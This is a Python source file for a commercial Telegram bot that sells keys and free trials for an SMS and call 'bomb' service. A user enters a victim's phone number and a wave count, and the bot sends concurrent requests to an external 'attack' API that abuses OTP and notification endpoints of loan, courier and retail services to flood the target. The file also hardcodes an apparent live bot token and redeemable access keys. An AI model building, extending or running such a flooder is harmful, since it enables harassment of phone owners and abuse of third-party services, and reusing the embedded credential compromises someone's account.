# language: Python, file: main.py, target: Telegram, Railway
# *100% Modal and Inline Button driven Telegram bot — zero text typing required in chat.*

import os
import time
import asyncio
import logging
import httpx
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import ApplicationBuilder, ContextTypes, CommandHandler, CallbackQueryHandler, MessageHandler, filters, ConversationHandler

BOT_TOKEN = "8947812851:AAHaYiJEhwZrDB-Z0oUPMO989Bs-Wbv0XgM"
OWNER_CONTACT = "t.me/mtfeels"
API_URL = "https://beboy-sms.vercel.app/attack"

PRICING = {
    "7d": {"name": "7 Days Access", "price": "₱100", "days": 7},
    "1m": {"name": "1 Month Access", "price": "₱150", "days": 30},
    "life": {"name": "Lifetime Access", "price": "₱199", "days": 36500}
}

USER_DATABASE = {}
VALID_KEYS = {
    "KEY-7D-PH99": "7d",
    "KEY-1M-PH55": "1m",
    "KEY-LIFE-PH88": "life"
}

SERVICES_INFO = [
    ("CALL_BOMB",        "📞", "Call Bomb     "),
    ("CUSTOM_SMS",       "✉️ ", "Custom SMS    "),
    ("EZLOAN",           "💳", "EZ Loan       "),
    ("XPRESS",           "⚡", "Xpress        "),
    ("ABENSON",          "🏪", "Abenson       "),
    ("EXCELLENT_LENDING","💰", "Excellent Lend"),
    ("FORTUNE_PAY",      "🎰", "Fortune Pay   "),
    ("WEMOVE",           "🚚", "WeMove        "),
    ("LBC",              "📦", "LBC           "),
    ("PICKUP_COFFEE",    "☕", "Pickup Coffee "),
    ("HONEY_LOAN",       "🍯", "Honey Loan    "),
    ("KOMO_PH",          "🦅", "Komo PH       "),
    ("S5_OTP",           "🔐", "S5 OTP        "),
]

ALL_SERVICE_KEYS = [s[0] for s in SERVICES_INFO]
logging.basicConfig(format="%(asctime)s - %(levelname)s - %(message)s", level=logging.WARNING)

# States for ConversationHandler
GET_PHONE, GET_BATCHES, GET_KEY = range(3)

def get_user_record(user_id):
    if user_id not in USER_DATABASE:
        USER_DATABASE[user_id] = {
            "verified": True,
            "attempts_left": 3,
            "expiry": 0,
            "key_type": None,
            "services": list(ALL_SERVICE_KEYS),
            "amount": 10,
            "target": "",
            "sender_name": "Unknown",
            "message": "You have a pending notification."
        }
    return USER_DATABASE[user_id]

def check_access(user_id):
    record = get_user_record(user_id)
    if record["key_type"] and time.time() < record["expiry"]:
        return True, "🌟 ACTIVE VIP KEY"
    if record["attempts_left"] > 0:
        return True, f"🎁 FREE TRIAL ({record['attempts_left']}/3 LEFT)"
    return False, "❌ EXPIRED"

def main_menu_keyboard():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("🚀 𝗦𝗘𝗟𝗘𝗖𝗧 𝗠𝗢𝗗𝗨𝗟𝗘𝗦 & 𝗟𝗔𝗨𝗡𝗖𝗛", callback_data="menu_modules")],
        [InlineKeyboardButton("🎯 𝗦𝗘𝗧 𝗧𝗔𝗥𝗚𝗘𝗧 & 𝙒𝗔𝗩𝗘𝗦", callback_data="set_target")],
        [InlineKeyboardButton("📊 𝗧𝗥𝗔𝗖𝗞𝗘𝗥 & 𝗦𝗧𝗔𝗧𝗦", callback_data="menu_stats"),
         InlineKeyboardButton("💎 𝗣𝗥𝗜𝗖𝗜𝗡𝗚 & 𝗣𝗟𝗔𝗡𝗦", callback_data="menu_pricing")],
        [InlineKeyboardButton("🛒 𝗕𝗨𝗬 𝗔𝗖𝗖𝗘𝗦𝗦 𝗞𝗘𝗬", url=f"https://{OWNER_CONTACT}"),
         InlineKeyboardButton("🔑 𝗥𝗘𝗗𝗘𝗘𝗠 𝗞𝗘𝗬", callback_data="menu_redeem")]
    ])

def modules_menu_keyboard(current_services):
    keyboard = []
    for key, icon, label in SERVICES_INFO:
        status = "● ON" if key in current_services else "○ OFF"
        keyboard.append([InlineKeyboardButton(f"{status} {icon} {label}", callback_data=f"toggle_{key}")])
    keyboard.append([InlineKeyboardButton("✨ 𝐋𝐀𝐔𝐍𝐂𝐇 𝐌𝐀𝐒𝐒𝐈𝐕𝐄 𝐅𝐋𝐎𝐎𝐃", callback_data="launch_execution")])
    keyboard.append([InlineKeyboardButton("🔙 𝑹𝑬𝑻𝑼𝑹𝑵 𝑻𝑶 𝑴𝑨𝑰𝑵 𝑴𝑬𝑵𝑼", callback_data="main_menu")])
    return InlineKeyboardMarkup(keyboard)

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    user_id = user.id
    text = (
        "╔═══════════════════════════╗\n"
        "║  ✦ 𝐅𝐋𝐎𝐎𝐃 𝐁𝐎𝐓 • 𝐌𝐀𝐒𝐒𝐈𝐕𝐄 ✦ ║\n"
        "╚═══════════════════════════╝\n\n"
        f"👤 **Operator:** `{user.first_name}`\n"
        f"⚡ **Status:** `{check_access(user_id)[1]}`\n\n"
        "╭── 𝑴𝑨𝑰𝑵 𝑻𝑬𝑹𝑴𝑰𝑵𝑨𝑳 𝑴𝑬𝑵𝑼 ──╮\n"
        "│ Select an operation below:\n"
        "╰───────────────────────────╯"
    )
    if update.callback_query:
        await update.callback_query.answer()
        await update.callback_query.message.edit_text(text, reply_markup=main_menu_keyboard(), parse_mode="Markdown")
    else:
        await update.message.reply_text(text, reply_markup=main_menu_keyboard(), parse_mode="Markdown")
    return ConversationHandler.END

async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    data = query.data
    user_id = query.from_user.id
    record = get_user_record(user_id)

    if data == "main_menu":
        await start(update, context)
        return ConversationHandler.END

    if data == "menu_modules":
        allowed, status_msg = check_access(user_id)
        if not allowed:
            await query.message.edit_text("❌ **𝐀𝐂𝐂𝐄𝐒𝐒 𝐄𝐗𝐏𝐈𝐑𝐄𝐃**", reply_markup=main_menu_keyboard(), parse_mode="Markdown")
            return ConversationHandler.END
        target_display = record['target'] if record['target'] else "⚠️ Not Set"
        text = (
            f"⚡ **𝐌𝐀𝐒𝐒𝐈𝐕𝐄 𝐌𝐎𝐃𝐔𝐋𝐄𝐒**\nStatus: `{status_msg}`\n"
            f"🎯 Target: `{target_display}` | Waves: `{record['amount']}`\n\n"
            f"Tap services to toggle or launch:"
        )
        await query.message.edit_text(text, reply_markup=modules_menu_keyboard(record["services"]), parse_mode="Markdown")
        return ConversationHandler.END

    if data.startswith("toggle_"):
        svc_key = data.replace("toggle_", "")
        if svc_key in record["services"]:
            record["services"].remove(svc_key)
        else:
            record["services"].append(svc_key)
        await query.message.edit_text(f"⚡ **𝐌𝐀𝐒𝐒𝐈𝐕𝐄 𝐌𝐎𝐃𝐔𝐋𝐄𝐒**\nUpdated active modules:", reply_markup=modules_menu_keyboard(record["services"]), parse_mode="Markdown")
        return ConversationHandler.END

    if data == "set_target":
        await query.message.edit_text("📱 **ENTER TARGET NUMBER**\nPlease type the target phone number now in chat (e.g. `09693457389`):", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Cancel", callback_data="main_menu")]]), parse_mode="Markdown")
        return GET_PHONE

    if data == "menu_stats":
        allowed, status_msg = check_access(user_id)
        await query.message.edit_text(f"📊 **𝐓𝐑𝐀𝐂𝐊𝐄𝐑**\nStatus: `{status_msg}`\nFree Tries: `{max(0, record['attempts_left'])}`\nCredits: `MTFEELS`", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 𝑹𝒆𝒕𝒖𝒓𝒏", callback_data="main_menu")]]), parse_mode="Markdown")
        return ConversationHandler.END

    if data == "menu_pricing":
        await query.message.edit_text(f"💎 **𝐏𝐑𝐈𝐂𝐈𝐍𝐆**\n7d: ₱100\n1m: ₱150\nLife: ₱199\nContact: @{OWNER_CONTACT}", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 𝑹𝒆𝒕𝒖𝒓𝒏", callback_data="main_menu")]]), parse_mode="Markdown")
        return ConversationHandler.END

    if data == "menu_redeem":
        await query.message.edit_text("🔑 **𝐑𝐄𝐃𝐄𝐌𝐏𝐓𝐈𝐎𝐍**\nPlease type your access key now in chat:", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Cancel", callback_data="main_menu")]]), parse_mode="Markdown")
        return GET_KEY

    if data == "launch_execution":
        if not record["target"]:
            await query.message.edit_text("❌ **Target not set!** Please click 'Set Target & Waves' first.", reply_markup=main_menu_keyboard(), parse_mode="Markdown")
            return ConversationHandler.END
        
        if not (record["key_type"] and time.time() < record["expiry"]):
            if record["attempts_left"] > 0:
                record["attempts_left"] -= 1
            else:
                await query.message.edit_text(f"❌ Free trials exhausted! Buy a key from **@{OWNER_CONTACT}**.", reply_markup=main_menu_keyboard(), parse_mode="Markdown")
                return ConversationHandler.END

        services = record["services"]
        batches = record["amount"]
        target_phone = record["target"]

        status_msg = await query.message.edit_text(f"🔥 **INITIATING MASSIVE FLOOD**\nTarget: `{target_phone}`\nConcurrent Services: `{len(services)}`\nWaves: `{batches}`", parse_mode="Markdown")

        success, fail = 0, 0

        async def fire_request(client, service_key):
            nonlocal success, fail
            try:
                resp = await client.post(
                    API_URL,
                    data={"phone": target_phone, "amount": "1", "sender_name": record["sender_name"], "message": record["message"]},
                    files={"services": (None, service_key)}
                )
                if resp.status_code == 200:
                    success += 1
                else:
                    fail += 1
            except Exception:
                fail += 1

        async with httpx.AsyncClient(timeout=45.0) as client:
            for wave in range(1, batches + 1):
                bar = "█" * int(20 * wave / batches) + "░" * (20 - int(20 * wave / batches))
                tasks = [fire_request(client, s) for s in services]
                await asyncio.gather(*tasks)

                try:
                    await status_msg.edit_text(
                        f"⚡ **MASS FLOODING WAVE {wave}/{batches}**\n"
                        f"Target: `{target_phone}`\n"
                        f"Progress: `[{bar}]` {int(wave/batches*100)}%\n"
                        f"🟢 Dispatched: `{success}` | 🔴 Errors: `{fail}`",
                        parse_mode="Markdown"
                    )
                except Exception:
                    pass
                await asyncio.sleep(0.2)

        await status_msg.edit_text(
            f"╔═══════════════════════════╗\n"
            f"║   💥 MASS FLOOD COMPLETE  ║\n"
            f"╚═══════════════════════════╝\n\n"
            f"  🟢 Total Dispatched : `{success}`\n"
            f"  🔴 Total Failed     : `{fail}`\n"
            f"  📊 Waves Executed   : `{batches}`\n\n"
            f"✨ *Full credits to MTFEELS*",
            reply_markup=main_menu_keyboard(),
            parse_mode="Markdown"
        )
        return ConversationHandler.END

async def receive_phone(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    text = update.message.text.strip()
    if not text.isdigit() or len(text) < 10:
        await update.message.reply_text("❌ Invalid phone number format. Please send a valid number:")
        return GET_PHONE
    
    record = get_user_record(user_id)
    record["target"] = text
    await update.message.reply_text(f"✅ Target set to `{text}`.\n\nNow enter the **number of waves / batches** (e.g., `15`):", parse_mode="Markdown")
    return GET_BATCHES

async def receive_batches(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    text = update.message.text.strip()
    if not text.isdigit():
        await update.message.reply_text("❌ Please enter a valid number for waves:")
        return GET_BATCHES

    record = get_user_record(user_id)
    record["amount"] = int(text)
    await update.message.reply_text(f"✅ Waves configured to `{text}`.\n\nReturning to main dashboard:", reply_markup=main_menu_keyboard(), parse_mode="Markdown")
    return ConversationHandler.END

async def receive_key(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    key = update.message.text.strip()
    record = get_user_record(user_id)

    if key in VALID_KEYS:
        k_type = VALID_KEYS[key]
        record["key_type"] = k_type
        record["expiry"] = time.time() + (PRICING[k_type]["days"] * 86400)
        record["attempts_left"] = 999999
        await update.message.reply_text(f"✅ **SUCCESS!** Redeemed {PRICING[k_type]['name']}.", parse_mode="Markdown", reply_markup=main_menu_keyboard())
    else:
        await update.message.reply_text("❌ **Invalid Key.** Try again or return to menu.", reply_markup=main_menu_keyboard())
    return ConversationHandler.END

def main():
    app = ApplicationBuilder().token(BOT_TOKEN).build()

    conv_handler = ConversationHandler(
        entry_points=[CallbackQueryHandler(button_callback)],
        states={
            GET_PHONE: [MessageHandler(filters.TEXT & ~filters.COMMAND, receive_phone)],
            GET_BATCHES: [MessageHandler(filters.TEXT & ~filters.COMMAND, receive_batches)],
            GET_KEY: [MessageHandler(filters.TEXT & ~filters.COMMAND, receive_key)],
        },
        fallbacks=[CommandHandler("start", start)]
    )

    app.add_handler(CommandHandler("start", start))
    app.add_handler(conv_handler)
    app.add_handler(CallbackQueryHandler(button_callback))
    app.run_polling()

if __name__ == "__main__":
    main()
